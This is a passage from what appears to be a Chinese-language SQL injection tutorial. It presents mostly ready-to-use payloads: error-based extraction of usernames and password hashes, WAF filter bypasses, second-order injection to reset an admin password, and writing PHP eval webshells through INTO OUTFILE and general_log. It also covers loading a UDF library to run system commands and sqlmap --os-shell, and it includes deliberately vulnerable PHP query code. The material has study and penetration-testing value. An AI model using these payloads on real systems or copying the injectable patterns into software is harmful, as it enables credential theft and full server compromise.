</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> </span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=mi>0</span><span class=n>x3a</span><span class=p>,</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=n>a</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h4 id=723-其它显错注入>7.2.3 其它显错注入</h4><div class=highlight id=id-15><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>database</span><span class=p>())))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=mi>1105</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~sectest&#39;</span><span class=p>,</span><span class=w> </span><span class=n>Time</span><span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=p>.</span><span class=mi>000000</span><span class=n>s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>and</span><span class=w> </span><span class=n>exp</span><span class=p>(</span><span class=o>~</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>())</span><span class=n>a</span><span class=p>))</span><span class=w> </span><span class=o>//</span><span class=w> </span><span class=n>mysql5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=n>NAME_CONST</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>),</span><span class=n>NAME_CONST</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>))</span><span class=n>a</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=mi>1060</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;5.7.23&#39;</span><span class=p>,</span><span class=w> </span><span class=n>Time</span><span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=p>.</span><span class=mi>000000</span><span class=n>s</span></span></span></code></pre></td></tr></table></div></div><h2 id=8堆叠注入>8、堆叠注入</h2><p>多条 SQL 语句一起执行。在 MySQL 中，每条语句结尾加 <code>;</code> 表示语句结束。这样可以考虑多条 SQL 语句一起使用</p><div class="details admonition question open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-question-circle fa-fw" aria-hidden=true></i>问题<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>堆叠注入和 UNION 注入的差别是？</p><p>UNION 执行的语句类型是有限的，只可以用来执行查询语句而堆叠注入可以执行任意语句</p></div></div></div><p>并不是每一个环境下都可以执行，很可能受 API 或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题</p><p>在真实环境中：</p><ol><li>通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的</li><li>在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</li></ol><p>在 PHP - MySQL 中相关的 API</p><div class=highlight id=id-16><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT CURRENT_USER();&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>.=</span> <span class=s2>&#34;SELECT Name FROM City ORDER BY ID LIMIT 20, 5&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* 批量执行查询 */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>multi_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* store first result set */</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$result</span> <span class=o>=</span> <span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>store_result</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=nv>$row</span> <span class=o>=</span> <span class=nv>$result</span><span class=o>-&gt;</span><span class=na>fetch_row</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>printf</span><span class=p>(</span><span class=s2>&#34;%s</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$row</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$result</span><span class=o>-&gt;</span><span class=na>free</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* print divider */</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>more_results</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>printf</span><span class=p>(</span><span class=s2>&#34;-----------------</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>next_result</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><h2 id=9-waf-绕过>9 WAF 绕过</h2><h3 id=91-and-和-or-绕过>9.1 and 和 or 绕过</h3><p>过滤代码：<code>preg_match('/(and|or)/i', $id)</code></p><p>绕过：利用 <code>||</code> 代替 <code>or</code>，<code>&&</code> 代替 <code>and</code></p><h3 id=92-union-过滤绕过>9.2 union 过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union)/i', $id)</code></p><p>绕过：</p><div class=highlight id=id-17><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>||</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span></span></span></code></pre></td></tr></table></div></div><div class="details admonition question open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-question-circle fa-fw" aria-hidden=true></i>问题<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>怎么知道 user 表、user 列、admin 字段？</p><ol><li>表名确实可以猜解，尤其是 user 这种常用表</li><li>如果猜不到，通过 <code>information_schema.tables</code> 及 <code>substr</code> 来联合判断</li><li>列名和字段内容也是同理</li></ol></div></div></div><h3 id=93-where-过滤绕过>9.3 where 过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where)/i', $id)</code></p><p>绕过：<code>|| (select user from users limit 1,1)='admin'</code></p><h3 id=94-limit-过滤绕过>9.4 limit 过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit)/i', $id)</code></p><p>绕过：<code>|| (select min(user) from group by user_id having user_id=1 ='admin'</code></p><h3 id=95-group-by-过滤绕过>9.5 group by 过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by)/i', $id)</code></p><p>绕过：</p><div class=highlight id=id-18><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>||</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=n>name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>test</span><span class=p>),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=s1>&#39;t&#39;</span></span></span></code></pre></td></tr></table></div></div><h3 id=96-select-及单引号过滤绕过>9.6 select 及单引号过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)</code></p><p>绕过：</p><p>布尔盲注不需要 select</p><div class=highlight id=id-19><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>||</span><span class=w> </span><span class=n>substr</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=mi>0</span><span class=n>x74</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>substr</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=n>unhex</span><span class=p>(</span><span class=mi>74</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h3 id=97-hexunhex-及-substr-过滤绕过---binary>9.7 hex、unhex 及 substr 过滤绕过 - binary</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr)/i', $id)</code></p><p>绕过：</p><div class=highlight id=id-20><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>||</span><span class=w> </span><span class=nb>binary</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x74657374</span></span></span></code></pre></td></tr></table></div></div><h3 id=98-空格过滤绕过>9.8 空格过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s)/i', $id)</code></p><p>绕过：注释符代替空格</p><h3 id=99-等号过滤绕过>9.9 等号过滤绕过</h3><p>过滤代码：<code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s| =)/i', $id)</code></p><p>绕过：利用 <code>like、rlike、regexp、!(username&lt;>"admin")(table_name&lt;>'ffll44jj')</code> 代替等号</p><h3 id=910-其它类型的绕过>9.10 其它类型的绕过</h3><ul><li>双写绕过</li><li>双重编码绕过</li></ul><h2 id=10二次注入>10、二次注入</h2><h3 id=101-原理>10.1 原理</h3><img src=https://s1.vika.cn/space/2023/04/01/40584478ee424d90ba5ab7af6fd7d99e style=zoom:80%><h3 id=102-实例>10.2 实例</h3><div class=highlight id=id-21><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--注册账号，输入我们的账号密码，账号设置成admin&#39;#,密码随意，admin&#39;#被存进数据库
</span></span></span><span class=line><span class=cl><span class=c1>--当我们修改admin&#39;#的密码时执行的sql语句是
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>update</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;$new_pass&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=o>#</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;$old_pass&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--这时候 and 条件被注释掉，我们随意输入密码就达到了，修改admin账户密码的目的</span></span></span></code></pre></td></tr></table></div></div><h2 id=11sql-注入命令执行>11、SQL 注入命令执行</h2><h3 id=111-sql-注入写文件>11.1 SQL 注入写文件</h3><p>通过 SQL 注入，直接写入 webshell 文件到服务器，通过 GET 方法或者 POST 方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>需要 mysql 用户在写入文件夹下有写入权限，即 <code>secure_file_priv</code> 为不为空</p><ul><li>在 MySQL 5.5.3 之前 <code>secure_file_priv</code> 默认是空，这个情况下可以向任意绝对路径写文件</li><li>在 MySQL 5.5.3 之后 <code>secure_file_priv</code> 默认是 NULL，这个情况下不可以写文件</li></ul></div></div></div><p>当<code>secure_file_priv</code> 不为空时，可以使用 general_log 写文件：</p><div class=highlight id=id-22><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>set</span><span class=w> </span><span class=k>global</span><span class=w> </span><span class=n>general_log</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>on</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>set</span><span class=w> </span><span class=k>global</span><span class=w> </span><span class=n>general_log_file</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;D:/webshell.php&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=s1>&#39;&lt;?php eval($_POST[&#39;</span><span class=k>key</span><span class=s1>&#39;]) ?&gt;&#39;</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><h4 id=1111-union-select-后写入>11.1.1 union select 后写入</h4><div class=highlight id=id-23><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>null</span><span class=p>,</span><span class=s1>&#39;&lt;?php @eval($_REQUEST[1]);?&gt;&#39;</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;/var/www/html/webshell.php&#39;</span></span></span></code></pre></td></tr></table></div></div><p><strong>注意</strong>：在 windows 下的分隔符为 /（斜杠）。</p><h4 id=1112-行分隔符写入>11.1.2 行分隔符写入</h4><p>lines terminated by 在每行终止的位置添加 xx 内容</p><p>lines starting by 以每行开始的位置添加 xx 内容</p><p>fields terminated by 以每个字段的位置添加 xx 内容</p><p>COLUMNS terminated by 以每个字段的位置添加 xx 内容</p><div class=highlight id=id-24><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--lines terminated by 写入
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class=w> </span><span class=n>lines</span><span class=w> </span><span class=n>terminated</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=s1>&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--lines starting by 写入
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class=w> </span><span class=n>lines</span><span class=w> </span><span class=n>starting</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=s1>&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--fields terminated by 写入
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class=w> </span><span class=n>fields</span><span class=w> </span><span class=n>terminated</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=s1>&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--COLUMNS terminated by 写入
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class=w> </span><span class=n>COLUMNS</span><span class=w> </span><span class=n>terminated</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=s1>&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><h3 id=112-用户自定义函数---udf>11.2 用户自定义函数 - UDF</h3><p>还可以利用「用户自定义函数」的方式，即 User Defined Functions(UDF) 来执行命令。通过 lib_mysqludf_sys 提供的函数可以执行<strong>系统命令</strong>关键语句:</p><ul><li>sys_eval()，执行任意命令，并将输出返回</li><li>sys_exec()，执行任意命令，并将返回码返回</li><li>sys_get()，获取一个环节变量</li><li>sys_set()，创建或修改一个环境变量</li></ul><h4 id=1121-udf-库文件获取>11.2.1 UDF 库文件获取</h4><p><a href=https://github.com/mysqludf/lib_mysqludf_sys target=_blank rel="external nofollow noopener noreferrer">https://github.com/mysqludf/lib_mysqludf_sys</a></p><p>sqlmap/data/udf/mysql/</p><p>sqlmap 下的文件经过编码，需要使用 sqlmap/extra/cloak 目录下的 cloak.py 文件进行解码</p><div class=highlight id=id-25><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 解码文件</span>
</span></span><span class=line><span class=cl>python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so</span></span></code></pre></td></tr></table></div></div><h4 id=1122-udf-库文件写入>11.2.2 UDF 库文件写入</h4><p>将 so 文件转成 16 进制，以 16 进制编码形式写入</p><div class=highlight id=id-26><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>unhex</span><span class=p>(</span><span class=s1>&#39;???&#39;</span><span class=p>)</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>dumpfile</span><span class=w> </span><span class=s1>&#39;/usr/lib/mysql/plugin/lib_linux.so&#39;</span></span></span></code></pre></td></tr></table></div></div><h4 id=1123-dumpfile-vs-outfile>11.2.3 dumpfile vs. outfile</h4><p>若我们想把一个可执行 2 进制文件用 into outfile 函数导出事实上导出后就会被破坏。</p><p>因为 into outfile 函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个 2 进制可执行文件就会被破坏。</p><p>这时候我们用 into dumpfile 就能导出一个完整能执行的 2 进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。</p><h4 id=1124-自定义函数>11.2.4 自定义函数</h4><div class=highlight id=id-27><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>create</span><span class=w> </span><span class=k>function</span><span class=w> </span><span class=n>sys_eval</span><span class=w> </span><span class=k>returns</span><span class=w> </span><span class=n>string</span><span class=w> </span><span class=n>soname</span><span class=w> </span><span class=s2>&#34;lib_linux.so&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>sys_eval</span><span class=p>(</span><span class=s1>&#39;ifconfig&#39;</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><h3 id=113-自动化工具>11.3 自动化工具</h3><div class=highlight id=id-28><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;url&#34;</span> --os-shell
</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;url&#34;</span> --os-cmd<span class=o>=</span>ifconfig</span></span></code></pre></td></tr></table></div></div><h2 id=12注入技巧>12、注入技巧</h2><p>从 SQL 语法角度，从不同的注入点位置说明 SQL 注入的技巧</p><h3 id=121-select-注入>12.1 SELECT 注入</h3><blockquote><p>select 语句用于数据表记录的查询，常在界面展示的过程中使用</p></blockquote><h4 id=1211-注入点在-select_expr>12.1.1 注入点在 select_expr</h4><p>源代码如下所示：</p><div class=highlight id=id-29><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$conn</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;root&#34;</span><span class=p>,</span> <span class=s2>&#34;root&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$res</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$conn</span><span class=p>,</span> <span class=s2>&#34;SELECT </span><span class=si>${</span><span class=nv>_GET[&#39;id&#39;]</span><span class=si>}</span><span class=s2>, content FROM wp_news&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_array</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$row[&#39;title&#39;]</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$row[&#39;content&#39;]</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>可以采取时间盲注的方式，但是根据 MySQL 的语法，有更优的解决方法，即利用 AS 别名的方法，直接将查询的结果显示到界面中。</p><p><strong>payload</strong>：<code>?id=(select pwd from wp_user as title)</code></p><h4 id=1212-注入点在-table_reference>12.1.2 注入点在 table_reference</h4><p>上文的 SQL 查询语句改为：<code>$res = mysqli_query($conn, "SELECT title FROM ${_GET['table']}");</code></p><p>仍然可以利用别名的方式直接取出数据</p><div class=highlight id=id-30><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select title from (select pwd AS title from wp_user)x</span></span></code></pre></td></tr></table></div></div><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>在不知表名的情况下，可以先从 information_schema.tables 中查询表名。</p><p>在 select_expr 和 table_reference 的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。</p></div></div></div><h4 id=1213-注入点在-where-或-having-后>12.1.3 注入点在 WHERE 或 HAVING 后</h4><p>SQL 语句：<code>$res = mysqli_query($conn, "SELECT title FROM wp_news WHERE id=${_GET[id]}")</code></p><p>实战中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在 HAVING 后的情况与之相似。</p><h4 id=1214-注入点在-group-by-或-order-by-后>12.1.4 注入点在 GROUP BY 或 ORDER BY 后</h4><h5 id=12141-利用报错>12.1.4.1 利用报错</h5><div class=highlight id=id-31><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
